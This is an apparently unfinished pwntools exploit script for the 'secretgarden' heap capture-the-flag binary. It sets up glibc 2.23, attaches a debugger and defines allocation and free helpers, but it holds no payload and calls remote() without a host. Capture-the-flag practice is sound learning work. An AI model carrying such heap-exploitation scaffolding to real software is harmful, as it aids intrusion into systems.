#!/usr/bin/env python3
from pwn import *

elf = ELF("./secretgarden_patched")
libc = ELF("./given/libc_64.so.6")
ld = ELF("./given/ld-2.23.so")

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        with open("/proc/{}/maps".format(p.pid), "rb") as f:
            mem_maps = f.read()
            f.close()
        mem_maps = mem_maps.split(b"\n")
        pie_base = None
        for region in mem_maps:
            if b"secretgarden_patched" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        log.info("PIE base: {}".format(hex(pie_base)))
        gdb.attach(p, "\n".join([
                "b *{}".format(hex(pie_base + 0x10f6)) # exit
            ]))
        log.info("[DATA] garden+0x202040")

def raise_flower(size, name, color):
    assert(len(color) < 23)
    assert(len(name) <= size)
    p.sendlineafter(b"Your choice : ", b"1")
    p.sendlineafter(b"Length of the name :", str(size).encode())
    p.sendlineafter(b"The name of flower :", name)
    p.sendlineafter(b"The color of the flower :", color)

def remove_flower(index):
    p.sendlineafter(b"Your choice : ", b"3")
    p.sendlineafter(b"Which flower do you want to remove from the garden:",
                    str(index).encode())
    success = p.recvuntil(b"Secret Garden")
    return b"Successful" in success

def clean_garden():
    p.sendlineafter(b"Your choice : ", b"4")

def mismatch():
    flower_struct_size = 0x28

    # f(flower), m(flower)
    raise_flower(flower_struct_size, b"1234", b"5678")
    remove_flower(0)
    clean_garden()


def exploit():
    raise_flower(10, b"a", b"b")
    raise_flower(20, b"c", b"d")
    p.interactive()


if __name__ == "__main__":
    exploit()
